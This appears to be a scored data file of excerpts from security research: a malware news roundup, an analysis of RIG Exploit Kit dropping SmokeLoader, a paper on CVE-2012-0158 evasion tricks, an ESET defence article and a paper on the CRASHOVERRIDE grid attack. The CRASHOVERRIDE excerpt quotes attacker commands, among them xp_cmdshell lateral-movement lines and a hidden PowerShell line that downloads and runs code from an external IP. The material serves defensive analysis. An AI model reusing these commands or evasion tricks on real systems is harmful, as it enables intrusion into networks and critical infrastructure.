Thomas Reed, our Mac expert, documented a particular adware installer that was able to gain root access to an Apple MAC’s OS X by exploiting a vulnerability on DYLD_PRINT_TO_FILE.
Finally, we also published a complete study on Bunitu in collaboration with our security experts, hasherezade and Sergei Frankoff, a researcher with Sentrant. Bunitu, a proxy Trojan, has played a part in malvertising campaigns as payload for certain exploit kits, usually Neutrino. We wrote about Bunitu in-depth last July, identifying why it’s dangerous to have this malware installed on systems. You may want to read about that first before delving into the study. Note that both posts are technical.
Notable news stories and security related happenings:",0.01190373207940243
"Battery Attributes Can Be Used To Track Web Users. “A team of European security researchers has published a paper analyzing how the battery life of mobile devices could be used to track web browsing habits of Firefox users on Linux, using the HTML5 Battery Status API.” (Source: TechCrunch)
Business Resilience Lacking in Most Firms, Finds Accenture. “Nearly two-thirds of companies are hit by cyber attacks daily or weekly, yet only a quarter always incorporate measures in their technology and operating models to make them more resilient, a survey shows.” (Source: Computer Weekly)
Succinct Reference To Key Airport Cybersecurity Threats/Attacks. “The Guidebook on Best Practices for Airport Security, produced under the auspices of the National Academies and the FAA, contains an interesting high level summary of key threat actions against airports.” (Source: Threat Brief)
Thousands of Dubizzle Users Told to Change Passwords After ‘Security Breach’. “Thousands of Dubizzle users have been told to change their passwords after a “security breach” compromised some information stored on the online company’s database.” (Source: The National)
Hacking-as-a-Service Makes Everyone Attack Capable. “Perhaps more disconcerting is the fact that this type of model allows actors with no discernible hacking skills to purchase the capability, thereby enabling any individual to become a hacker, if the price is right.” (Source: Norse Corp’s Dark Matters Blog)
After Car Hack, Internet of Things Looks Riskier. “Last month’s revelation that hackers could remotely seize control of over a million Chrysler automobiles has delivered a stark warning that life in an ultra-networked world could be very dangerous, indeed.” (Source: The Boston Globe)
Researchers Create First Firmware Worm that Attacks Macs. “Two researchers have found that several known vulnerabilities affecting the firmware of all the top PC makers can also hit the firmware of MACs. What’s more, the researchers have designed a proof-of-concept worm for the first time that would allow a firmware attack to spread automatically from MacBook to MacBook, without the need for them to be networked.” (Source: Wired)
Addressing the Continuing Challenges of Mobile Devices. “Organizations hoping to avoid the fate of so many others tripped up by device disasters must be perplexed regarding the course of action they should adopt. Given the critical role that such devices play in most business operations, few if any clients will likely ever be free from such challenges. Those challenges generally fall into three categories: data security, information retention, and e-discovery.” (Source: Legal Tech News)
79% of Companies Release Apps with Known Vulnerabilities. “The application development process is rampant with security risks due to current business pressures, according to new research released at Black Hat USA 2015 by Prevoty.” (Source: Help Net Security)
The Leading Cause of Insider Threats? Employee Negligence. “It can cost a U.S. company as much as $1.5 million and Germany companies €1.6 million in time wasted responding to security incidents caused by human error, according to the Ponemon Institute.” (Source: Help Net Security)
Social Engineering: 6 Commonly Targeted Data Points that are Poorly Protected. “Now in its sixth year, the Social Engineering village at DEF CON has always been an interesting location. Each year the village hosts talks and interactive lessons on human hacking, but the major draw is the Social Engineering Capture the Flag contest.” (Source: CSO Online)
Malvertising Attacks Increasingly Target Mobile Apps, Says RiskIQ Report. “Overall, the number of unique malvertisements jumped 260 percent in the first half of this year compared to the same period in 2014, based on nearly 2 billion websites and 10 million mobile apps RiskIQ monitors daily using a global proxy network and virtual user technology.” (Source: Fierce Mobile IT)
A Massive Security Bug Lets Criminals Install Bogus Apps on Your iPhone — and They Look Like the Real Thing. “The installations occur when users unwittingly click on web links that trigger the downloads. Bogus apps include malware versions of Twitter, Facebook, WhatsApp.” (Source: Business Insider)
Under Pressure, Google Promises To Update Android Security Regularly. “Last week researchers with Zimperium, a mobile security firm, said they’d discovered major flaws in the heart of the Android operating system (in a library called “libstagefright”). This bug would allow hackers to take over nearly 1 billion phones, just by sending an infected text message.” (Source: NPR)
500 Free Virgin Airlines Flights Being Given Away on Facebook? It’s a Scam. “Thousands of Facebook users had believed that the message, which claimed to offer 500 free flights with Virgin Airlines if you *just* clicked “Like”, left a comment and shared the post with their friends, was genuine.” (Source: Graham Cluley’s Blog)
Warning: Zero-day Vulnerabilities Found in Top-selling Amazon Smart Home Systems. “If left unpatched, some of the vulnerabilities revealed in VERT’s analysis could be exploited through malicious web pages or smartphone applications and execute commands with system level access.” (Source: IT Pro Portal)
Ad Firms are the Reason Adobe’s Flash Still Exists—Despite Its Many, Many Security Flaws. “Last month, Mozilla blocked Flash from its Firefox browser until Adobe released an update patching another security flaw. According to CVE Details, a database that tracks online vulnerabilities, there have been 511 reported Flash vulnerabilities since 2005, and the number has been rising in recent years, with 133 instances in the year to date alone.” (Source: QZ)
Senate Cybersecurity Bill Vote Delayed Again. “Despite attempts to vote on CISA prior to August recess, senators have agreed to revisit the bill in September with additional amendments.” (Source: Legal Tech News)
Oh No ZigBee, as Another Front Opens on Home Networking Insecurity. “Security researchers have exposed new flaws in ZigBee, one of the most popular wireless communication standards used by Internet of Things (IoT) devices.” (Source: The Registry)
New Malware Turns Your Computer into a Cellular Antenna. “A group of Israeli researchers have improved on a way to steal data from air-gapped computers, thought to be safer from attack due to their isolation from the Internet. They’ve figured out how to turn the computer into a cellular transmitter, leaking bits of data that can be picked up by a nearby low-end mobile phone.” (Source: PC World)
Boards’ Lack of Cybersecurity Knowledge Puts Companies at Greater Risk: Study. “Corporate board members that fail to employ adequate oversight on cybersecurity matters are compromising their company’s security defenses.” (Source: Legal Tech News)",0.017425971556568998
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
RIG Exploit Kit Makes A Sprash In Russia,0.008889788767586837
The very popular Russian site Sprashivai[.]ru has been compromised and is silently redirecting users to the RIG Exploit Kit (EK). During our analysis we saw RIG EK drop the SmokeLoader (aka Dofoil) malware.,0.01831134031420867
Image above taken from the Sprashivai homepage,0.009463241648148712
Compromised Site,0.00943873621125113
"Sprashivai[.]ru is a popular Russian Q&A and social networking site, receiving an estimated 20 million visitors per month according to SimilarWeb. The Russian word ""sprashivai"" means ""ask"" in English.",0.013408237497002484
The site has been compromised by an actor attempting to redirect users to RIG EK via an injected iFrame:,0.0073599917780803326
"The iFrame loads up the RIG EK landing page which then attempts to exploit the machine if it is using outdated browser components, such as an old Adobe Flash Player. If successfully exploited, RIG EK will drop and execute malware on the machine. All of this is done silently in the background without any user interaction necessary.",0.010403716702590105
"During our analysis RIG EK sent a CVE-2015-8651 Adobe Flash Player exploit. The SWF exploit contains debug strings suggesting a user named Владимир (""Vladimir"") compiled the exploit, although the ActionScript filenames appear to be somewhat randomised:",0.015697770670930256
Sprashivai has been compromised since at least June 23 and was still compromised when we checked again on June 29. We notified Sprashivai of the compromise on June 27 but have not heard anything back.,0.01164381750580934
June 23,0.008426956773773031
hxxp://sprashivai[.]ru/ (Compromised Site),0.011808006937487958
--> hxxp://jy.raleighculturalresources[.]org/?xH**redacted** (RIG EK),0.013018329185160993
June 27,0.008472502472230081
hxxp://sprashivai[.]ru/ (Compromised Site),0.011808006937487958
--> hxxp://sd.studio-aceti[.]com/?x3**redacted** (RIG EK),0.010629818549582892
June 29,0.008597411183204673
hxxp://sprashivai[.]ru/ (Compromised Site),0.011808006937487958
--> hxxp://ht.navisage[.]com/?xX**redacted** (RIG EK),0.010877377185075754
SmokeLoader,0.008333991699404963
During our analysis RIG EK dropped and executed the SmokeLoader (aka Dofoil) malware. The original executable that was dropped was a Nullsoft Installer System (NSIS) executable that decrypted and executed the SmokeLoader payload. This technique makes it difficult for anti-virus solutions to detect because NSIS files themselves are legitimate and the scripting ability makes them extremely versatile.,0.015113181125143482
"The NSIS installer dropped two important files, Aero.dll and Votary.C. The Aero.dll module is invoked from the NSIS script and is responsible for decrypting and loading the Votary.C SmokeLoader payload.",0.008998594401842142
The SmokeLoader payload is then injected into explorer.exe and execution continues from there. The malware will attempt to reach out to its C&C (reamstat[.]link) among a sea of fake requests it generates to legitimate sites too. The fake requests are sent to URLs taken from the HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall registry sub-keys.,0.010754851116287267
"SmokeLoader's primary purpose is to download plug-ins which contain malicious functionality such as credential stealers, click fraud components, and more trojan downloaders like Win32/Recslurp.",0.013468762209119745
"According to a superb analysis by Stopmalvertising, SmokeLoader began to be sold to only Russian speaking individuals in March 2014. So it is interesting that we see SmokeLoader being dropped via a compromised Russian site, and therefore affecting Russian speaking individuals.",0.012624812962637288
Protection Statement,0.009481584346963334
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:,0.008136822717896841
Stage 2 (Lure) - The injected code on the compromised site is detected and the site is blocked.,0.012229191561149433
Stage 4 (Exploit Kit) - The RIG EK landing page is detected and blocked.,0.018426943460967515
Stage 5 (Dropper File) - The malicious NSIS executable is detected by File Sandboxing.,0.015969679709790463
Indicators of Compromise (IOCs),0.019393949867491322
Compromised Site,0.00943873621125113
hxxp://sprashivai[.]ru,0.009091941503657663
RIG Exploit Kit,0.007718371594558793
hxxp://jy.raleighculturalresources[.]org,0.012897474087185001
hxxp://sd.studio-aceti[.]com,0.009921975485851164
hxxp://ht.navisage[.]com,0.009852831781317906
SmokeLoader C&C,0.007335960515551521
hxxp://reamstat[.]link,0.008962700423581271
SmokeLoader Samples (SHA1),0.01643170691632856
9680e89c4a11aaee448b27d25a2342ebf9b5d367,0.009513682326951933
fc8756b848262c237e1e7a6028ee97a70c7f0e1f,0.009759104132513685
Summary,0.009602684635656611
"Actors continue to compromise popular sites and develop new and unique ways to try and stay undetected. These criminals do not always need to resort to malvertising to tap into a pool of millions of potential victims. And while crypto-ransomware remains one of the most popular weapons of choice, malware developers and distributors also continue to use backdoors like SmokeLoader.
",0.012591997873981353
"Cat-and-mouse game in CVE 2012-0158
2013-05-03",0.010961100376082777
"Ruhai Zhang
Fortinet
,
China
Editor:
Helen",0.010015711170538899
"Martin
Abstract
Ruhai Zhang takes a look at the cat-and-mouse game of exploit samples, focusing on the widely used CVE-2012-0158 vulnerability.
Copyright © 2013 Virus Bulletin",0.014921774192730664
"The CVE-2012-0158 vulnerability has been widely used by cybercriminals since April 2012 and has been exploited in the wild with many anti-detection tricks. As we know, when an exploit sample is executed, the corresponding vulnerable application will initially load and parse it. While scanning an exploit file, an AV engine will also analyse its file format. For some file types with complicated structures, the AV engine may struggle to parse all of the structures listed in the format specification. Moreover, for efficiency, fault-tolerant performance purposes, or even through carelessness, an application may not fully comply with the format specification while parsing a file. These factors open a door in the cat-and-mouse game. The exploit in question can be implemented in both Microsoft Office and RTF files, which increases its spreading ability.",0.012371475162960444
"Vulnerability analysis
The CVE-2012-0158 vulnerability is in the ListView, ListView2, TreeView and TreeView2 ActiveX controls in MSCOMCTL.OCX, which are mainly used in Microsoft Office, as shown in Figure 1.
Figure 1. An exploit sample’s ListView Contents stream.
Figure 2. Vulnerable parsing function in MSCOMCTL.OCX (v6.01.9545).
The following is the execution process for the vulnerable function in MSCOMCTL.OCX, as shown in Figure 2:
Read a 0xC bytes record in the ‘Contents’ stream to the stack buffer, which has the following structure:
struct CobjRecord {
DWORD flag;
DWORD unknown;
DWORD next_read_len;
}",0.0125332792009053
"Get the value next_read_len.
In the second call to the CheckLenAndReadRecord function, the Next Record Len value is read (see Figure 1) and compared with next_read_len value in the CobjRecord. If the two length values are equal, the following next_read_len bytes size data will be read to the stack buffer. However, only eight bytes are allocated on the stack.
For the sample (MD5: C694ED321C758AF7D4F7582A415DEDE9) shown in Figure 1, the vulnerable function will return to address 0x27583C30 and then jump to the shellcode at 0x125DA4, as shown in Figure 3, Figure 4 and Figure 5.
Figure 3. Stack overview after overflow.
Figure 4. Jmp esp instruction in MSCOMCTL.OCX (v6.01.9545).
Figure 5. Jmp to the shellcode.",0.011877136779661401
Office file format anti-detection tricks,0.01083854786754812
"End of Chain Sector ID
Figure 6 is a rough flow chart showing how Microsoft Office reads stream data.
Figure 6. Reading stream data flow chart.
The sample (MD5: 52a87d2cd564900904aea8869c00f6c6) shown in Figure 7and Figure 8 uses this trick. The End Of Chain SecID at offset 10252 should have been 4, a continuous value. It is likely that this value was modified in an attempt to evade detection. If the AV engine recognizes the End of Chain SecID as the end of the stream data, this kind of crafted exploit sample may slip away undetected.
Figure 7. A sample’s Contents directory entry.
Figure 8. A sample’s short-sector allocation table.",0.01491519109035322
"Microsoft Excel default password
Figure 9 shows the process of Microsoft Excel validating password-protected documents:
Figure 9. A password-protected Excel sample’s Workbook stream.
The decryption key is derived from the default password ‘VelvetSweatshop’ and Salt.
The EncryptedVerifier field is decrypted using the derived key.
The hashing algorithm output is obtained by using the above decrypted Verifier as input.
The EncryptedVerifierHash field is decrypted using the key derived in step 1.
If the above two hash values are equal, execution will continue. If they are not, the user will be prompted to input the password and validate it as per the above steps.
We can see that password-protected Microsoft Excel documents can be executed without entering the password while it is set to the default ‘VelvetSweatshop’.
Figure 10. A password-protected Excel sample’s directory entries.
Figure 9 and Figure 10 show a sample (MD5: 5c7d74dd1c96651d22c5829039ab93bd) using this trick. The exploit relevant data is encrypted in the ‘encryption’ stream. We can see the following decrypted exploiting structure in the memory:
Figure 11. A sample’s decrypted exploiting data in the memory.",0.011191328319437144
"RTF file format anti-detection tricks
This exploit can also be embedded into an RTF file as an OLE object, so some tricks relevant to RTF parsing can also be used.",0.015370094265265588
"RTF magic checking
While parsing an RTF file, Microsoft Word will not check the fifth character (‘f’ in the ‘\rtfN’ control word), as shown in Figure 12.
Figure 12. RTF magic parsing in WINWORD.EXE (v11.0.5604).
The sample (MD5: 63eb0c0ae2853c9398d94569cf5eadcf) shown in Figure 13 uses this trick. If the AV engine recognizes the RTF file totally as described in the RTF specification, this kind of crafted exploit sample will escape detection.
Figure 13. An exploit sample using the RTF magic trick.",0.015112453183740548
"RTF object obfuscating
The exploit OLE file is embedded into an RTF file using control word ‘\object’. The object data is encoded using the ‘Hex to ASCII’ method. While parsing the object data, Microsoft Word will ignore space characters and other control words.
Figure 14 shows a sample (MD5: f8ec2de6927ac7a22a88f8a2f6c2ebd3) using this trick. The OLE file magic ‘D0CF11E0A1B11AE1’ value is not continuous, but separated by some space characters and RTF control words.
Figure 14. An exploit sample using RTF obfuscating tricks.
The sample (MD5: 4c4d397511fd8f802950218d598c3478) shown in Figure 15 also uses this trick. In this sample, several useful characters are separated by some obfuscating RTF groups ‘{}’, which may also contain some useful characters.
Figure 15. Another exploit sample using RTF obfuscating tricks.
To detect this kind of crafted sample, an AV engine must also ignore the obfuscating characters and structures while parsing the OLE object from an RTF file.",0.017652971870532275
"Conclusion
The cat-and-mouse game of exploit samples is based largely around the differences in file format parsing between the vulnerable application and the detection engine. One exploit sample which seems corrupted because of unusual structures may indeed execute correctly. For each type of file, the engine should try to parse its file format exactly as its corresponding application does, and not simply rely on its format specification.",0.010307537467426853
"Bibliography
[1] CVE-2012-0158. http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158.
[2] Microsoft Office Document Cryptography Structure. http://msdn.microsoft.com/en-us/library/cc313071(v=office.12).aspx.
",0.010727489219306552
"Big changes in the infosec landscape: Time to take note and take action
There are big changes happening to the infosec landscape:, says ESET's Michael Aguilar. It's therefore time to take note and take action.",0.014434131622832358
Michael Aguilar,0.008491641224307345
8 May 2017 - 02:00PM,0.010863636266661536
"There are big changes happening to the infosec landscape:, says ESET’s Michael Aguilar. It’s therefore time to take note and take action.",0.013528141473095334
Recent events are changing the topography of the threat model and attack methodologies across the board and at record speeds – to say that the impact of the past few weeks in information security news has been small would be a complete understatement.,0.01716810811527103
"The Shadow Brokers releasing full-blown government hack frameworks, VAULT 7 releases, and other nefarious deeds, have elevated even the lowliest of script kiddies into valid threats to enterprise-level businesses.",0.014601730046433059
"If you do not believe this, please place your head back in the sand. Record numbers of breaches of entire networks and payment systems are becoming more the de-facto computer event to investigate instead of small-scale user-based infections that used to plague businesses.",0.01526526207905543
"It is time to up your game plan to the real world: an ongoing battle against malicious actors targeting you, your business, your home, your electronics and potentially every communication device that you own that is capable of networking.",0.01549406803451725
"When Windows 2008 R2 systems can be fully compromised in less than 120 seconds, it is time to get serious, fast. Here are a few things you can do to get back in the game and get your network security up to 21st century standards.",0.014930199680912692
RDP: Remote death protocol,0.00885107959207343
"Do you like RDP? Good. So do attackers. Wait? What?! Yes, attackers love your weakly-defended RDP port as the payoff can be huge. Instead of having to use a pesky sometimes non-persistent terminal shell, they can just log right in with a Windows interface or use other tools to execute applications on your server remotely. The lowest hanging fruit is the abandoned credentials that have way too much access that you forgot to delete years ago, akin to helpdesk:helpdesk or other credentials that should never have existed, ever.",0.01154205866845548
"It is possible to compromise other, seemingly more password-protected accounts, especially if the password is derived from an aspect of your business. In this manner, an attacker could easily generate a mutation wordlist consisting of a few hundred thousand varied words located on your informative website to run as administrator against the potentially open RDP port. As an administrator, you should think about changing the port (not to 3390 but something else) or use RDP over a VPN connection, closing off outside access to unwanted parties.",0.009857701532169805
"Another, and even better idea is to also have a secondary control mechanism, like 2FA (two-factor authentication) to allow you to have something that a potential attacker does not: a token or OTP (one time password).",0.021805346802954206
Microsoft even has the ability to lock out accounts that try to authenticate more than a certain number of times (instructions can be located here). Check out this link for more info on RDP attacks.,0.010715224702479098
"Windows updates, firmware updates, everything updates",0.011472097147509519
"With the release of various exploits from different avenues that affect Windows 8, Windows Server 2012 and SMBv3, updating Windows has become more important than ever. There are more dangerous exploits out in the wild than members in some IT departments: these are precompiled, awaiting public consumption.",0.009573874359015244
"As mentioned previously, the releasing of the Shadow Brokers’ decryption key for their cache of allegedly stolen “government” exploit kits is a very real cause for concern since these tools are now actually being used in real time against targets. The good news is that Microsoft has already patched the zero-day vulnerability and other security issues that created the vulnerabilities.",0.010900917212181671
"The question is, how up-to-date are the patches in your network? Updating is a continuous effort, as new threats arise and must be addressed and newer security holes are discovered and must be closed. Sometimes, that includes upgrading your antivirus.",0.012796674137614539
"Take CVE-2017-0199, a vulnerability that was recently turned into a Metasploit module for ease of use. This zero-day exploit has been discovered dropping Dridex and other malware and can be modified for multiple payloads.",0.007780875067220139
"This exploit started getting attention on April 11, 2017. At the time of writing, ESET was one of only nine vendors detecting attachments with this exploit payload. Sometimes, in updating your defense mechanisms, you find that you need to update your antivirus strategy as well.",0.010010833519287443
"Sleep better at night, play it safe",0.013370441954585033
"The fewer footprints you leave on the open internet, the better. Close those ports that do not need to be opened for everyone to query. If your business runs a web application that you can get to from the open internet, ensure that it is tuned, hardened, and not running vulnerable code.",0.013083931369292534
"The last thing you would want is your entire CRM (customer relationship management software) or other business communications platforms compromised, with client or personnel data presented to an attacker who resides halfway around the world.",0.014329606594115751
"Explaining this is a difficult letter to write to your client base; however, it would not be the first time this has ever happened and it definitely won’t be the last one as this latest issue regarding HipChat has proven.",0.011124803042233067
"The information security world spins pretty fast. If you don’t stop and look around once in a while, you could miss it. It worked for Ferris; make it work for you.
",0.013688905479181002
VB2018 paper: Anatomy of an attack: detecting and defeating CRASHOVERRIDE,0.01006884545527964
Joe Slowik,0.008722674004226105
"Dragos, USA",0.008740327487727462
Copyright © 2018 Virus Bulletin,0.009633121006031975
"Table of contents
Abstract Background Adversary Initial intrusion Pivoting to ICS Movement within ICS CRASHOVERRIDE CRASHOVERRIDE modules Launcher module Brief review of grid operations protocols IEC-101 IEC-104 IEC-61850 OPC Hybrid payload: OPC + 61850 Wiper module Primary backdoor module Impeding recovery Alternate backdoor Context and mitigation Acknowledgements References Footnotes Appendix A – List of sample hashes Appendix B – Remote execution and survey script",0.011845222269370903
Abstract,0.009485057568311417
"CRASHOVERRIDE is the first publicly known malware designed to impact electric grid operations. While some attention has already been paid to CRASHOVERRIDE’s ICS-specific effects, the broader scope of the attack – and the prerequisites for its execution – have been woefully under-examined.",0.010026553191568754
"Reviewing previously unavailable data covering logs, forensics, and various incident information, this paper will outline the CRASHOVERRIDE attack in its entirety, from breach of the ICS network through delivery and execution of ICS-specific payloads. This examination will show that, aside from the requirement to develop and deploy ICS-targeting software for its final effects, CRASHOVERRIDE largely relied upon fairly standard intrusion techniques in order to achieve its results. By understanding this methodology and how these techniques can be monitored and detected, ICS asset owners and defenders can begin to identify detection and visibility gaps in order to catch such techniques in the future.",0.010903895741227854
"While CRASHOVERRIDE effectively represents a new application of malware to produce a physical impact, the underlying techniques for intrusion and deployment would immediately be recognizable even to a junior penetration tester. In demystifying this attack, defenders and testers can gain greater appreciation both for the existing vulnerabilities within electric grid operations and for the steps required to build effective defences.",0.015601773816141695
Background,0.00895880133864857
"At the time of its discovery, CRASHOVERRIDE was the second publicly known ICS-targeting malware, and the first to target the electric grid (see Figure 1). While previous operations had taken place against electric grid operations (most notably the 2015 Ukraine outage attributed to SANDWORM) none had used malware to deliver, semi-autonomously, the actual ICS impact.",0.016049687856013795
Figure 1: ICS malware events.,0.020540674127183745
"Initial public reporting of the attack focused on CRASHOVERRIDE’s impact on energy grid operations, which included a relatively brief blackout in a specific Kiev substation in late December 2016. While concerning, CRASHOVERRIDE’s ultimate, direct effects were rather unimpressive considering the underlying possibilities of the malware in question. Much more concerning than the immediate impact was the implicit message behind the attack: that adversaries were now able and willing to invest time and resources in developing software specifically designed to manipulate electric grid operations.",0.010014120628034417
"CRASHOVERRIDE itself is a modular malware framework designed to deploy several ICS protocol-specific attack payloads in order to disrupt electricity distribution. Given this function, CRASHOVERRIDE must be deployed on an endpoint within the target network that is capable of directly manipulating or communicating with ICS controlling equipment. Furthermore, CRASHOVERRIDE will only function if supplied with the appropriate protocol-specific communication module for the equipment in the victim environment.",0.012206036997099434
"CRASHOVERRIDE’s implementation and execution is certainly interesting, but the attack itself represents the final action in a complex, multi-staged sequence. Devoting inordinate attention to CRASHOVERRIDE’s final attack sequence ignores the multiple stages prior to effect delivery during which this assault could have been detected, stopped, or mitigated.",0.009482559096455234
"While an understanding of CRASHOVERRIDE’s fundamentals is important, and will be addressed in this paper, CRASHOVERRIDE is best understood as an event with multiple, inter-dependent stages. As shown in Figure 2, the actual implementation of the malware represents the final stage in a complex operation.",0.011016594307968308
Figure 2: ICS cyber kill chain.,0.028417028769771036
"Understanding how these individual, dependent actions work with each other enables us to form a better understanding of CRASHOVERRIDE as an attack, starting with the initial intrusion into the IT network, all the way through to the execution of an ICS disruptive payload. By taking this approach, ICS owners and operators can identify multiple potential points at which a CRASHOVERRIDE-like attack can be detected, mitigated and defeated before it reaches the final stages of the ICS cyber kill chain.",0.015217937352093536
Adversary,0.008772833107234201
"Following analysis of CRASHOVERRIDE in mid-2017, researchers at Dragos identified strong links between the entity executing the CRASHOVERRIDE attack and the SANDWORM APT actor that was responsible for the 2015 Ukraine outage [1]. Subsequent investigation and analysis of confidential information indicated that the group responsible for CRASHOVERRIDE, ELECTRUM, may previously have served as the ICS capability development team for SANDWORM, and possibly executed greater operational autonomy with respect to 2016 events in Kiev. Henceforth, when referring to the adversary executing the CRASHOVERRIDE attack, this paper will default to ELECTRUM.",0.017187208847555646
Figure 3: ELECTRUM overview.,0.01765631360669806
"Based on its association with SANDWORM, ELECTRUM aligns with Russian strategic interests and is believed to be a capable, well-resourced adversary. While many aspects of ELECTRUM’s activity remain uncertain, available information indicates that the group possesses specialized development capabilities for ICS-specific software and remains operationally active.",0.018206052600136968
Initial intrusion,0.008079961158349191
"Initial infection vectors are often very difficult to identify post-incident when viewing information gleaned through external research. Based on available evidence and subsequent information in this paper, we can identify the initial intrusion to the target environment as possibly having emerged from a phishing campaign as early as January 2016. This earliest possible date places events in Ukraine almost a year prior to the CRASHOVERRIDE impact, and mere weeks following the 2015 Ukrainian power event. Based on analysis of additional recovered artifacts, we can say that initial access and entrenchment in the IT network was achieved no later than October 2016.",0.012102140419973262
Pivoting to ICS,0.008768682481318568
"Specific information on how ELECTRUM navigated from IT to ICS – a critical inflection point for ICS intrusion events – remains elusive. Based on information presented in the next section, ELECTRUM most likely leveraged credential capture on compromised IT machines to build up a corpus of logons and additional authentication information. From this step, and similar in some respects to the 2015 Ukrainian power outage, ELECTRUM would re-use legitimate credentials to remotely log onto machines within the ICS environment, or leverage existing VPN connections.",0.014197996001923174
"From recovered log and system data, we know that the adversary initially accessed a device in early December that was either dual-homed on the IT and ICS networks or featured connectivity to the IT network. This compromise pre-dated any other interactions with hosts in the ICS environment. Given this timeline information and initial activity focusing on user account manipulation in early December, ELECTRUM appears to have used this device as its ‘beach head’ within the ICS network.",0.011069232531103812
"Starting on 1 December 2016 at 01:28 (unspecified time zone in recovered log data), rapid user account modifications take place on this initial ICS access server focused on two newly created accounts, ‘admin’ and ‘система’ (System). The accounts are created, assigned to a domain matching local operations, and privileges delegated before event logging on the impacted system is disabled at 01:29. The speed of the above operations implies at minimum adversary scripting to make multiple changes within a short span of time.",0.012138565092441378
Movement within ICS,0.0071615459024626515
"ELECTRUM activity then appeared to slow within the network, until a significant and rapid resumption of operations on 12 December 2016. At this point, a new host appears in the records. Based on captured artifacts and logs, this new host was a Microsoft Windows Server 2003 device running Microsoft SQL Server. Subsequent investigation indicated that two other similar devices, featuring the same naming schema (e.g. ‘Device-1’, ‘Device-2’, etc.), were also accessed by the attacker. Within an ICS environment a database server can act as a type of data historian for process and control system information [2]. In this role, the devices would be expected to have extensive connections to other hosts within the network – including devices that are either directly involved in critical process operations, or that are directly connected to such hosts.",0.014819562754133875
"The first signs of interaction occurred at approximately 13:00 on 12 December 2016, with several actions that appeared to be initial reconnaissance. For example, ELECTRUM began querying directory info, performing directory listings, and testing network connectivity. These actions continued for approximately two hours and included network connectivity checks to other named resources in the victim environment. This suggests the attacker had already performed sufficient reconnaissance of the ICS environment to have identified hosts of interest. Unfortunately, corresponding log data was not available to provide definitive evidence to back up this assumption.",0.012371761427522165
"ELECTRUM then executed a script to test authentication capability to a series of named hosts within the control system network. While the original script was not recovered, in log data a series of rapid RPC authentication attempts to multiple hosts were observed for user ‘Administrator’ with the same password across over 100 endpoints, specified by host name. The combination of credential specificity and host-name identification strongly indicates significant reconnaissance activity having taken place between initial access to the ICS environment in early December and the observed activity in mid-December.",0.012390927300919508
"In both this activity and other survey, reconnaissance and execution items, nearly all commands across all three server hosts were executed in the following manner:",0.010812081625442338
EXEC xp_cmdshell <command>,0.010125481866823716
"The above format adds concrete evidence to the theory that the server hosts were MS-SQL servers, as ‘xp_cmdshell’ is an MS-SQL command that allows for the execution of arbitrary commands [3]. From this, ELECTRUM appears to leverage MS-SQL access to the central ‘pivot’ machines in order to gain code execution throughout the ICS environment. By identifying both a means to occupy a strategic, central node for the victim network and an effective, but not easy-to-identify method for command execution, ELECTRUM placed itself in an excellent position to broaden the scope of the compromise.",0.009984192718706764
"In addition to the above, ELECTRUM also attempted to create a link between servers [4]. While the exact destination server was not recovered in data, the following command was observed:",0.009838447262549566
"“BEGIN EXEC master.dbo.sp_addlinkedserver @server = N’” & strLink & “’, @srvproduct=N’SQL Server’; EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname=N’” & strLink & “’,@useself=N’False’,@rmtuser=N’admin’,@rmtpassword=’<PASSWORD>’; END;”",0.015135030923357662
"ELECTRUM used a variety of native system commands, known utilities, and custom scripts from the core server hosts. With the exception of a UPX-packed copy of Mimikatz1, no actual malware aside from the final CRASHOVERRIDE payload was observed in available data. Examples of commands executed include the following:",0.009620417514858537
"EXEC xp_cmdshell ‘net use L: \\<TargetIP>\$C <Password> /USER:<Domain>\<User>’;
EXEC xp_cmdshell ‘move C:\Delta\m32.txt C:\Delta\m32.exe’;
EXEC xp_cmdshell ‘netstat -an’;",0.015334566268429772
"The ‘move’ command is interesting, as it reflects behaviour seen in multiple instances where ELECTRUM transferred files into the ICS network as ‘.txt’ extensions. After moving the relevant files to victims in the ICS environment, the files were renamed as ‘.exe’ items using the move command prior to further operations. While simple and not especially elegant, such a technique can be used to defeat very simple detection methodologies based on extension tracking.",0.009927095790911777
"In addition, scripts and the SysInternals PSExec program were used for additional functions. Of note, ELECTRUM renamed the PSExec executable ‘ps.exe’ and used an older version than the latest available at the time of the attack. While PSExec 2.2, published in July 2016, would have been the most recent version, ELECTRUM instead utilized version 2.11, published in April 2014 [5].",0.00967985560521023
"From a script perspective, multiple VBS and BAT scripts were used in the event to facilitate file movement, system survey, and as a wrapper for PowerShell execution. For example, one lengthy script, ‘remote.vbs’, provides the ability to remotely query another system when given an IP, user name, and password. The script itself (provided in Appendix B) is essentially a collection of benign WMI and similar queries used to perform system survey information and command execution. Looking at the source code, there are overlaps with multiple publicly available examples for running WMI queries but no exact matches. Examples of script use for remote process execution include the following:",0.012021966921665128
"EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<UserName> /p:<Password> /t:-r arp -a’
EXEC xp_cmdshell ‘cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<UserName> /p:<Password> /t:-r dir C:\intel\’;",0.014445992245742167
A different example is a simple BAT script used to execute PowerShell:,0.009525588168848076
powershell.exe -nop -w hidden -c $l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(‘http://188.42.253.43:8801/msupdate’);,0.01297987227005215
"Aside from being proxy-aware, the above is a simple, unobfuscated PowerShell script used to retrieve a file. Unfortunately, at the time of discovery the resource specified was no longer available, so its exact function and purpose are unknown.",0.007944053560910103
"Fuelling much, if not most of this activity was the ability to capture and reuse legitimate network credentials within the victim environment. As stated previously, the adversary used Mimikatz for this purpose. Most interestingly for the assumed level of attack sophistication and the wide variety of options available for obfuscating Mimikatz or running it within memory, ELECTRUM simply compiled the publicly available Mimikatz source code and packed it with UPX. While the tool itself remains effective, from a detection and mitigation standpoint this choice is very curious.",0.011424855333766137
"Tying all of the above together, ELECTRUM leveraged a combination of scripts, remote process execution and credential harvesting to penetrate the environment and ‘seed’ it with a final, malicious payload: CRASHOVERRIDE.",0.010268467189848307
CRASHOVERRIDE,0.009051991834875484
